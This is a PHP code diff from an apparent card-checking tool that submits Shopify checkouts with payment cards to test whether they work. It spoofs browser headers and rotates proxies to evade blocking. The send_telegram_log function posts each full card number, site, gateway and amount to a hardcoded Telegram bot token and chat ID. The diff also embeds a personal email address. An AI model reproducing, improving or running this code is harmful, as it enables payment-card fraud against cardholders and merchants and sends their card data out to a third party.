+    $postf = json_encode(['query' => extractOperationQueryFromFile('jsonp.php', 'SubmitForCompletion'),
+        'variables' => [
+            'input' => [
+                'sessionInput' => [
+                        'sessionToken' => $x_checkout_one_session_token
+                    ],
+                    'queueToken' => $queue_token,
+                'discounts' => [
+                    'lines' => [],
+                    'acceptUnexpectedDiscounts' => true
+                ],
+                'delivery' => [
+                    'deliveryLines' => [
+                        [
+                            'selectedDeliveryStrategy' => [
+                                'deliveryStrategyMatchingConditions' => [
+                                    'estimatedTimeInTransit' => [
+                                        'any' => true
+                                    ],
+                                    'shipments' => [
+                                        'any' => true
+                                    ]
+                                ],
+                                'options' => new stdClass()
+                            ],
+                            'targetMerchandiseLines' => [
+                                'lines' => [
+                                    [
+                                        'stableId' => $stable_id
+                                    ]
+                                ]
+                            ],
+                            'deliveryMethodTypes' => [
+                                'NONE'
+                            ],
+                            'expectedTotalPrice' => [
+                                'any' => true
+                            ],
+                            'destinationChanged' => true
+                        ]
+                    ],
+                    'noDeliveryRequired' => [],
+                    'useProgressiveRates' => false,
+                    'prefetchShippingRatesStrategy' => null,
+                    'supportsSplitShipping' => true
+                ],
+                'deliveryExpectations' => [
+                    'deliveryExpectationLines' => []
+                ],
+                'merchandise' => [
+                    'merchandiseLines' => [
+                        [
+                            'stableId' => $stable_id,
+                            'merchandise' => [
+                                'productVariantReference' => [
+                                    'id' => 'gid://shopify/ProductVariantMerchandise/' . $prodid,
+                                        'variantId' => 'gid://shopify/ProductVariant/' . $prodid,
+                                    'properties' => [],
+                                    'sellingPlanId' => null,
+                                    'sellingPlanDigest' => null
+                                ]
+                            ],
+                            'quantity' => [
+                                'items' => [
+                                    'value' => 1
+                                ]
+                            ],
+                            'expectedTotalPrice' => [
+                                'value' => [
+                                    'amount' => $minPrice,
+                                    'currencyCode' => 'NZD'
+                                ]
+                            ],
+                            'lineComponentsSource' => null,
+                            'lineComponents' => []
+                        ]
+                    ]
+                ],
+                'payment' => [
+                    'totalAmount' => [
+                        'any' => true
+                    ],
+                    'paymentLines' => [
+                        [
+                            'paymentMethod' => [
+                                'directPaymentMethod' => [
+                                    'paymentMethodIdentifier' => $paymentMethodIdentifier,
+                                    'sessionId' => $cctoken,
+                                    'billingAddress' => [
+                                        'streetAddress' => [
+                                            'address1' => '11 Northside Drive',
+                                            'address2' => 'Westgate',
+                                            'city' => 'Auckland',
+                                            'countryCode' => 'NZ',
+                                            'postalCode' => '0814',
+                                            'firstName' => 'xypher',
+                                            'lastName' => 'xd',
+                                            'zoneCode' => 'AUK',
+                                            'phone' => ''
+                                        ]
+                                    ],
+                                    'cardSource' => null
+                                ],
+                                'giftCardPaymentMethod' => null,
+                                'redeemablePaymentMethod' => null,
+                                'walletPaymentMethod' => null,
+                                'walletsPlatformPaymentMethod' => null,
+                                'localPaymentMethod' => null,
+                                'paymentOnDeliveryMethod' => null,
+                                'paymentOnDeliveryMethod2' => null,
+                                'manualPaymentMethod' => null,
+                                'customPaymentMethod' => null,
+                                'offsitePaymentMethod' => null,
+                                'customOnsitePaymentMethod' => null,
+                                'deferredPaymentMethod' => null,
+                                'customerCreditCardPaymentMethod' => null,
+                                'paypalBillingAgreementPaymentMethod' => null
+                            ],
+                            'amount' => [
+                                'value' => [
+                                    'amount' => $totalamt,
+                                    'currencyCode' => 'NZD'
+                                ]
+                            ],
+                            'dueAt' => null
+                        ]
+                    ],
+                    'billingAddress' => [
+                        'streetAddress' => [
+                            'address1' => '11 Northside Drive',
+                            'address2' => 'Westgate',
+                            'city' => 'Auckland',
+                            'countryCode' => 'NZ',
+                            'postalCode' => '0814',
+                            'firstName' => 'xypher',
+                            'lastName' => 'xd',
+                            'zoneCode' => 'AUK',
+                            'phone' => ''
+                        ]
+                    ]
+                ],
+                'buyerIdentity' => [
+                    'customer' => [
+                        'presentmentCurrency' => 'NZD',
+                        'countryCode' => 'IN'
+                    ],
+                    'email' => 'insaneff612@gmail.com',
+                    'emailChanged' => false,
+                    'phoneCountryCode' => 'IN',
+                    'marketingConsent' => [],
+                    'shopPayOptInPhone' => [
+                        'number' => '',
+                        'countryCode' => 'IN'
+                    ],
+                    'rememberMe' => false
+                ],
+                'tip' => [
+                    'tipLines' => []
+                ],
+                'taxes' => [
+                    'proposedAllocations' => null,
+                    'proposedTotalAmount' => [
+                        'value' => [
+                            'amount' => '0',
+                            'currencyCode' => 'NZD'
+                        ]
+                    ],
+                    'proposedTotalIncludedAmount' => null,
+                    'proposedMixedStateTotalAmount' => null,
+                    'proposedExemptions' => []
+                ],
+                'note' => [
+                    'message' => null,
+                    'customAttributes' => []
+                ],
+                'localizationExtension' => [
+                    'fields' => []
+                ],
+                'nonNegotiableTerms' => null,
+                'scriptFingerprint' => [
+                    'signature' => null,
+                    'signatureUuid' => null,
+                    'lineItemScriptChanges' => [],
+                    'paymentScriptChanges' => [],
+                    'shippingScriptChanges' => []
+                ],
+                'optionalDuties' => [
+                    'buyerRefusesDuties' => false
+                ]
+            ],
+            'attemptToken' => $checkoutToken . '-y4dcjm00nor',
+            'metafields' => [],
+            'analytics' => [
+                'requestUrl' => $urlbase.'/checkouts/cn/'.$checkoutToken,
+                'pageId' => $stable_id
+            ]
+        ],
+        'operationName' => 'SubmitForCompletion'
+    ]);
+}
+
+ else {$postf = json_encode([
+ 'query' => extractOperationQueryFromFile('jsonp.php', 'SubmitForCompletion'),  
+         'variables' => [
+             'input' => [
+                 'sessionInput' => [
+                     'sessionToken' => $x_checkout_one_session_token
+                 ],
+                 'queueToken' => $queue_token,
+                 'discounts' => [
+                     'lines' => [],
+                     'acceptUnexpectedDiscounts' => true
+                 ],
+                 'delivery' => [
+                     'deliveryLines' => [
+                         [
+                             'destination' => [
+                                 'streetAddress' => [
+                                     'address1' => $address,
+                                     'address2' => '',
+                                     'city' => $city_us,
+                                     'countryCode' => 'US',
+                                     'postalCode' => $zip_us,
+                                     'firstName' => $firstname,
+                                     'lastName' => $lastname,
+                                     'zoneCode' => $zip_us,
+                                     'phone' => $phone,
+                                     'oneTimeUse' => false,
+                                     'coordinates' => [
+                                         'latitude' => $lat,
+                                         'longitude' => $lon
+                                     ]
+                                 ]
+                             ],
+                             'selectedDeliveryStrategy' => [
+                                 'deliveryStrategyByHandle' => [
+                                     'handle' => $handle,
+                                     'customDeliveryRate' => false
+                                 ],
+                                 'options' => new stdClass()
+                             ],
+                             'targetMerchandiseLines' => [
+                                 'lines' => [
+                                     [
+                                         'stableId' => $stable_id
+                                     ]
+                                 ]
+                             ],
+                             'deliveryMethodTypes' => [
+                                 'SHIPPING',
+                                 'LOCAL'
+                             ],
+                             'expectedTotalPrice' => [
+                                 'value' => [
+                                     'amount' => $delamount,
+                                     'currencyCode' => 'USD'
+                                 ]
+                             ],
+                             'destinationChanged' => false
+                         ]
+                     ],
+                     'noDeliveryRequired' => [],
+                     'useProgressiveRates' => false,
+                     'prefetchShippingRatesStrategy' => null,
+                     'supportsSplitShipping' => true
+                 ],
+                 'deliveryExpectations' => [
+                     'deliveryExpectationLines' => []
+                 ],
+                 'merchandise' => [
+                     'merchandiseLines' => [
+                         [
+                             'stableId' => $stable_id,
+                             'merchandise' => [
+                                 'productVariantReference' => [
+                                     'id' => 'gid://shopify/ProductVariantMerchandise/' . $prodid,
+                                     'variantId' => 'gid://shopify/ProductVariant/' . $prodid,
+                                     'properties' => [],
+                                     'sellingPlanId' => null,
+                                     'sellingPlanDigest' => null
+                                 ]
+                             ],
+                             'quantity' => [
+                                 'items' => [
+                                     'value' => 1
+                                 ]
+                             ],
+                             'expectedTotalPrice' => [
+                                 'value' => [
+                                     'amount' => $minPrice,
+                                     'currencyCode' => 'USD'
+                                 ]
+                             ],
+                             'lineComponentsSource' => null,
+                             'lineComponents' => []
+                         ]
+                     ]
+                 ],
+                 'payment' => [
+                     'totalAmount' => [
+                         'any' => true
+                     ],
+                     'paymentLines' => [
+                         [
+                             'paymentMethod' => [
+                                 'directPaymentMethod' => [
+                                     'paymentMethodIdentifier' => $paymentMethodIdentifier,
+                                     'sessionId' => $cctoken,
+                                     'billingAddress' => [
+                                         'streetAddress' => [
+                                             'address1' => $address,
+                                             'address2' => '',
+                                             'city' => $city_us,
+                                             'countryCode' => 'US',
+                                             'postalCode' => $zip_us,
+                                             'firstName' => $firstname,
+                                             'lastName' => $lastname,
+                                             'zoneCode' => $zip_us,
+                                             'phone' => $phone
+                                         ]
+                                     ],
+                                     'cardSource' => null
+                                 ],
+                                 'giftCardPaymentMethod' => null,
+                                 'redeemablePaymentMethod' => null,
+                                 'walletPaymentMethod' => null,
+                                 'walletsPlatformPaymentMethod' => null,
+                                 'localPaymentMethod' => null,
+                                 'paymentOnDeliveryMethod' => null,
+                                 'paymentOnDeliveryMethod2' => null,
+                                 'manualPaymentMethod' => null,
+                                 'customPaymentMethod' => null,
+                                 'offsitePaymentMethod' => null,
+                                 'customOnsitePaymentMethod' => null,
+                                 'deferredPaymentMethod' => null,
+                                 'customerCreditCardPaymentMethod' => null,
+                                 'paypalBillingAgreementPaymentMethod' => null
+                             ],
+                             'amount' => [
+                                 'value' => [
+                                     'amount' => $totalamt,
+                                     'currencyCode' => 'USD'
+                                 ]
+                             ],
+                             'dueAt' => null
+                         ]
+                     ],
+                     'billingAddress' => [
+                         'streetAddress' => [
+                             'address1' => $address,
+                             'address2' => '',
+                             'city' => $city_us,
+                             'countryCode' => 'US',
+                             'postalCode' => $zip_us,
+                             'firstName' => $firstname,
+                             'lastName' => $lastname,
+                             'zoneCode' => $state_us,
+                             'phone' => $phone
+                         ]
+                     ]
+                 ],
+                 'buyerIdentity' => [
+                     'customer' => [
+                         'presentmentCurrency' => 'USD',
+                         'countryCode' => 'US'
+                     ],
+                     'email' => $email,
+                     'emailChanged' => false,
+                     'phoneCountryCode' => 'US',
+                     'marketingConsent' => [],
+                     'shopPayOptInPhone' => [
+                         'countryCode' => 'US'
+                     ]
+                 ],
+                 'tip' => [
+                     'tipLines' => []
+                 ],
+                 'taxes' => [
+                     'proposedAllocations' => null,
+                     'proposedTotalAmount' => [
+                         'value' => [
+                             'amount' => $tax,
+                             'currencyCode' => 'USD'
+                         ]
+                     ],
+                     'proposedTotalIncludedAmount' => null,
+                     'proposedMixedStateTotalAmount' => null,
+                     'proposedExemptions' => []
+                 ],
+                 'note' => [
+                     'message' => null,
+                     'customAttributes' => []
+                 ],
+                 'localizationExtension' => [
+                     'fields' => []
+                 ],
+                 'nonNegotiableTerms' => null,
+                 'scriptFingerprint' => [
+                     'signature' => null,
+                     'signatureUuid' => null,
+                     'lineItemScriptChanges' => [],
+                     'paymentScriptChanges' => [],
+                     'shippingScriptChanges' => []
+                 ],
+                 'optionalDuties' => [
+                     'buyerRefusesDuties' => false
+                 ]
+             ],
+             'attemptToken' => ''.$checkoutToken.'-0a6d87fj9zmj',
+             'metafields' => [],
+             'analytics' => [
+                 'requestUrl' => $urlbase.'/checkouts/cn/'.$checkoutToken,
+                 'pageId' => $stable_id
+             ]
+         ],
+         'operationName' => 'SubmitForCompletion'
+     ]);    
+ }
+     $totalamt = $firstStrategy->runningTotal->value->amount;
+ recipt:
+     // timed wait between proposal and receipt poll
+     if (runtime_cfg()['sleep']>0) { sleep(runtime_cfg()['sleep']); }
+      $ch = curl_init();
+  curl_setopt($ch, CURLOPT_URL, $urlbase.'/checkouts/unstable/graphql?operationName=SubmitForCompletion');
+  apply_proxy_if_used($ch, $urlbase);
+  apply_common_timeouts($ch);
+
+ curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+ curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
+ curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
+ curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
+ curl_setopt($ch, CURLOPT_HTTPHEADER, [
+     'accept: application/json',
+     'accept-language: en-US',
+     'content-type: application/json',
+     'origin: '.$urlbase,
+     'priority: u=1, i',
+     'referer: '.$urlbase.'/',
+     'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
+     'sec-ch-ua-mobile: ?0',
+     'sec-ch-ua-platform: "Windows"',
+     'sec-fetch-dest: empty',
+     'sec-fetch-mode: cors',
+     'sec-fetch-site: same-origin',
+     'user-agent: '.$ua,
+     'x-checkout-one-session-token: ' . $x_checkout_one_session_token,
+     'x-checkout-web-deploy-stage: production',
+     'x-checkout-web-server-handling: fast',
+     'x-checkout-web-server-rendering: no',
+     'x-checkout-web-source-id: ' . $checkoutToken,
+     'Expect:',
+ ]);
+
+
+ curl_setopt($ch, CURLOPT_POSTFIELDS, $postf);
+
+ $response4 = curl_exec($ch);
+ $curlErr = curl_errno($ch);
+ $curlErrMsg = curl_error($ch);
+ curl_close($ch);
+ //echo "<li>receipt: $response4<li>";
+ if ($curlErr) {
+     if ($retryCount < $maxRetries) {
+         $retryCount++;
+         goto recipt; 
+     } else {
+         $err = 'cURL error: ' . $curlErrMsg;
+         $result_data = [
+        'Response' => $err,
+    ];
+    $result_data['ProxyStatus'] = $proxy_status;
+    $result_data['ProxyIP'] = ($proxy_used ? $proxy_ip : 'N/A');
+    $result = json_encode($result_data);
+         send_final_response(json_decode($result, true), $proxy_used, $proxy_ip, $proxy_port);
+         exit;
+     }
+ }
+
+ $response4js = json_decode($response4);
+
+ if (isset($response4js->data->submitForCompletion->receipt->id)) {
+     $recipt_id = $response4js->data->submitForCompletion->receipt->id;
+ } elseif (empty($recipt_id)) {
+     // Rotate proxy and retry when receipt is empty (up to 3 rotations)
+     static $receiptRotateAttempts = 0;
+     if ($receiptRotateAttempts < 3 && !$noproxy_requested) {
+         $receiptRotateAttempts++;
+         $alt = select_working_proxy_for_url('ProxyList.txt', $site1, 4, 20);
+         if ($alt) {
+             $ptype = 'http';
+             $addr = $alt;
+             if (preg_match('/^(https?|socks4|socks5):\/\/(.+)$/i', $alt, $m)) { $ptype = strtolower($m[1]); $addr = $m[2]; }
+             $parts = explode(':', $addr);
+             if (count($parts) >= 2) {
+                 $proxy_ip = $parts[0];
+                 $proxy_port = $parts[1];
+                 if (count($parts) >= 4) { $proxy_user = $parts[2]; $proxy_pass = $parts[3]; }
+                 $proxy_type = $ptype;
+                 $proxy_used = true;
+                 $proxy_status = 'Live (rotated due to empty receipt)';
+             }
+         }
+         goto proposal; // rebuild session with new proxy
+     }
+     $err = 'Receipt ID is empty';
+     $result_data = [
+        'Response' => $err,
+    ];
+    $result_data['ProxyStatus'] = $proxy_status;
+    $result_data['ProxyIP'] = ($proxy_used ? $proxy_ip : 'N/A');
+    $result = json_encode($result_data);
+     send_final_response(json_decode($result, true), $proxy_used, $proxy_ip, $proxy_port);
+     exit;
+ }
+
+ 
+ 
+ poll:
+ $postf2 = json_encode([
+     'query' => extractOperationQueryFromFile('jsonp.php', 'PollForReceipt'),
+     'variables' => [
+         'receiptId' => $recipt_id,
+         'sessionToken' => $x_checkout_one_session_token
+     ],
+     'operationName' => 'PollForReceipt'
+ ]);
+ // optional short wait between polls
+ if (runtime_cfg()['sleep']>0) { sleep(runtime_cfg()['sleep']); }
+ $ch = curl_init();
+ curl_setopt($ch, CURLOPT_URL, $urlbase.'/checkouts/unstable/graphql?operationName=PollForReceipt');
+ apply_proxy_if_used($ch, $urlbase);
+ apply_common_timeouts($ch);
+
+ curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+ curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
+ curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
+ curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
+ curl_setopt($ch, CURLOPT_HTTPHEADER, [
+'accept: application/json',
+'accept-language: en-US',
+'content-type: application/json',
+'origin: '.$urlbase,
+'priority: u=1, i',
+'referer: '.$urlbase,
+'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
+'sec-ch-ua-mobile: ?0',
+'sec-ch-ua-platform: "Windows"',
+'sec-fetch-dest: empty',
+'sec-fetch-mode: cors',
+'sec-fetch-site: same-origin',
+'user-agent: '.$ua,
+'x-checkout-one-session-token: ' . $x_checkout_one_session_token,
+'x-checkout-web-build-id: ' . $web_build_id,
+'x-checkout-web-deploy-stage: production',
+'x-checkout-web-server-handling: fast',
+'x-checkout-web-server-rendering: no',
+'x-checkout-web-source-id: ' . $checkoutToken,
+]);
+
+curl_setopt($ch, CURLOPT_POSTFIELDS, $postf2);
+
+$response5 = curl_exec($ch);
+$curlErr = curl_errno($ch);
+$curlErrMsg = curl_error($ch);
+curl_close($ch);
+// echo "<li>Resp_5: $response5<li>";
+if ($curlErr) {
+    if ($retryCount < $maxRetries) {
+        $retryCount++;
+        goto poll; 
+    } else {
+    $err = 'cURL error: ' . $curlErrMsg;
+    $result_array = [
+        'Response' => $err,
+        'ProxyStatus' => $proxy_status,
+        'ProxyIP' => ($proxy_used ? $proxy_ip : 'N/A')
+    ];
+    $result = json_encode($result_array);
+    send_final_response(json_decode($result, true), $proxy_used, $proxy_ip, $proxy_port);
+    exit;
+}
+}
+if (strpos($response5, '"__typename":"ProcessingReceipt"') !== false) {
+    sleep(2); // Espera 3 segundos antes de reintentar
+    if ($retryCount < $maxRetries) {
+        $retryCount++;
+        goto poll;
+    } else {
+        send_final_response(['Response' => 'Error: Max Retries'], $proxy_used, $proxy_ip, $proxy_port);
+    }
+}
+if (strpos($response5, '"__typename":"WaitingReceipt"') !== false) {
+    sleep(2); // Espera 3 segundos antes de reintentar
+    if ($retryCount < $maxRetries) {
+        $retryCount++;
+        goto poll;
+    } else {
+        send_final_response(['Response' => 'Error: Max Retries'], $proxy_used, $proxy_ip, $proxy_port);
+    }
+}
+
+// echo "<li>CheckoutUrl: $checkouturl<li>";
+$file = "cc_responses.txt";
+$handle = fopen($file, "a");
+$content = "cc = $cc1\nresponse = $response5\n\n";
+$r5js = (json_decode($response5));
+$start_time = microtime(true);
+
+function send_telegram_log($bot_token, $chat_id, $message) {
+    // Enrich every message with proxy and timestamp info automatically
+    global $proxy_used, $proxy_ip, $proxy_port;
+    $sentAt = date('Y-m-d H:i:s');
+    $proxyStr = $proxy_used ? (trim($proxy_ip).':'.trim($proxy_port)) : 'N/A';
+
+    // If message ends with </pre>, try to insert inside the block for better formatting
+    if (preg_match('#</pre>\s*$#i', $message)) {
+        $extra = "\n<b>Proxy:</b> $proxyStr\n<b>Sent At:</b> $sentAt";
+        $message = preg_replace('#</pre>\s*$#i', $extra.'</pre>', $message, 1);
+    } else {
+        $message .= "\n<b>Proxy:</b> $proxyStr\n<b>Sent At:</b> $sentAt";
+    }
+
+    $url = "https://api.telegram.org/bot$bot_token/sendMessage";
+    $maxRetries = 3; // Max retries for Telegram message
+    $retryCount = 0;
+
+    do {
+        $ch = curl_init($url);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, [
+            'chat_id' => $chat_id,
+            'text' => $message,
+            'parse_mode' => 'HTML'
+        ]);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        $result = curl_exec($ch);
+        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+
+        if ($result !== false && $http_code == 200) {
+            return true; // Success
+        }
+        $retryCount++;
+        sleep(1); // Wait 1 second before retrying
+    } while ($retryCount < $maxRetries);
+
+    return false; // Failed after retries
+}
+
+if (
+strpos($response5, $checkouturl . '/thank_you') ||
+strpos($response5, $checkouturl . '/post_purchase') ||
+strpos($response5, 'Your order is confirmed') ||
+strpos($response5, 'Thank you') ||
+strpos($response5, 'ThankYou') ||
+strpos($response5, 'thank_you') ||
+strpos($response5, 'success') ||
+strpos($response5, 'classicThankYouPageUrl') ||
+strpos($response5, '"__typename":"ProcessedReceipt"') ||
+strpos($response5, 'SUCCESS')
+) {
+// fwrite($handle, $content);
+// fclose($handle);
+$err = 'Thank You ' . $totalamt;
+$response_type = 'Thank You';
+$time_taken = round(microtime(true) - $start_time, 2);
+$log_message = "<b>GooD CarD 🔥</b>\n" .
+"<b>Full Card:</b> <code>$cc1</code>\n" .
+"<pre><b>Site:</b> $checkouturl\n" .
+"<b>Response:</b> $response_type\n" .
+"<b>Gateway:</b> $gateway\n" .
+"<b>Amount:</b> $totalamt$\n" .
+"<b>Time:</b> {$time_taken}s</pre>";
+send_telegram_log("8063859579:AAHiOG2O4oBDJJswouRUScMOZDxGACXigPI", "5652614329", $log_message);
+$result = json_encode([
+'Response' => $err,
+'Price' => $totalamt,
+'Gateway' => $gateway,
+'cc' => $cc1,
+]);
+send_final_response(json_decode($result, true), $proxy_used, $proxy_ip, $proxy_port);
+exit;
+} elseif (strpos($response5, 'CompletePaymentChallenge')) {
+$err = '3ds cc';
+$time_taken = round(microtime(true) - $start_time, 2);
+$log_message = "<b>3DS CarD ⚠️</b>\n" .
+"<b>Full Card:</b> <code>$cc1</code>\n" .
+"<pre><b>Site:</b> $checkouturl\n" .
+"<b>Response:</b> 3DS Challenge\n" .
+"<b>Gateway:</b> $gateway\n" .
+"<b>Amount:</b> $totalamt$\n" .
+"<b>Time:</b> {$time_taken}s</pre>";
+send_telegram_log("8063859579:AAHiOG2O4oBDJJswouRUScMOZDxGACXigPI", "5652614329", $log_message);
+$result_data = [
+'Response' => $err,
+'Price' => $totalamt,
+'Gateway' => $gateway,
+'cc' => $cc1,
+];
+send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
+exit;
+} elseif (strpos($response5, '/stripe/authentications/')) {
+$err = '3ds cc';
+$time_taken = round(microtime(true) - $start_time, 2);
+$log_message = "<b>3DS CarD ⚠️</b>\n" .
+"<b>Full Card:</b> <code>$cc1</code>\n" .
+"<pre><b>Site:</b> $checkouturl\n" .
+"<b>Response:</b> 3DS Challenge\n" .
+"<b>Gateway:</b> $gateway\n" .
+"<b>Amount:</b> $totalamt$\n" .
+"<b>Time:</b> {$time_taken}s</pre>";
+send_telegram_log("8063859579:AAHiOG2O4oBDJJswouRUScMOZDxGACXigPI", "5652614329", $log_message);
+$result_data = [
+'Response' => $err,
+'Price' => $totalamt,
+'Gateway' => $gateway,
+'cc' => $cc1,
+];
+send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
+exit;
+}
+elseif (isset($r5js->data->receipt->processingError->code)) {
+$err = $r5js->data->receipt->processingError->code;
+if ($err == 'incorrect_zip') {
+$response_type = $err;
+$time_taken = round(microtime(true) - $start_time, 2);
+$log_message = "<b>INCORRECT ZIP ❌</b>\n" .
+"<b>Full Card:</b> <code>$cc1</code>\n" .
+"<pre><b>Site:</b> $checkouturl\n" .
+"<b>Response:</b> $response_type\n" .
+"<b>Gateway:</b> $gateway\n" .
+"<b>Amount:</b> $totalamt$\n" .
+"<b>Time:</b> {$time_taken}s</pre>";
+send_telegram_log("8063859579:AAHiOG2O4oBDJJswouRUScMOZDxGACXigPI", "5652614329", $log_message);
+}
+$result = json_encode([
+'Response' => $err,
+'Price' => $totalamt,
+'Gateway' => $gateway,
+'cc' => $cc1
+]);
+// Log all other error responses to Telegram
+if ($err != 'incorrect_zip') {
+    $time_taken = round(microtime(true) - $start_time, 2);
+    $log_all = "<b>CC CHECKED</b>\n" .
+    "<b>Full Card:</b> <code>$cc1</code>\n" .
+    "<pre><b>Site:</b> $checkouturl\n" .
+    "<b>Response:</b> $err\n" .
+    "<b>Gateway:</b> $gateway\n" .
+    "<b>Amount:</b> $totalamt$\n" .
+    "<b>Time:</b> {$time_taken}s</pre>";
+    send_telegram_log("8063859579:AAHiOG2O4oBDJJswouRUScMOZDxGACXigPI", "5652614329", $log_all);
+}
+send_final_response(json_decode($result, true), $proxy_used, $proxy_ip, $proxy_port);
+exit;
+} else {
+// fwrite($handle, $content);
+// fclose($handle);
+$err = 'Response Not Found';
+$time_taken = round(microtime(true) - $start_time, 2);
+$log_message = "<b>Response Not Found ?</b>\n" .
+"<b>Full Card:</b> <code>$cc1</code>\n" .
+"<pre><b>Site:</b> $checkouturl\n" .
+"<b>Response:</b> Unknown/Not Found\n" .
+"<b>Gateway:</b> $gateway\n" .
+"<b>Amount:</b> $totalamt$\n" .
+"<b>Time:</b> {$time_taken}s</pre>";
+send_telegram_log("8063859579:AAHiOG2O4oBDJJswouRUScMOZDxGACXigPI", "5652614329", $log_message);
+$result_array = [
+        'Response' => $err,
+        'ProxyStatus' => $proxy_status,
+        'ProxyIP' => ($proxy_used ? $proxy_ip : 'N/A')
+    ];
+    $result = json_encode($result_array);
+send_final_response(json_decode($result, true), $proxy_used, $proxy_ip, $proxy_port);
+exit;
+}
+
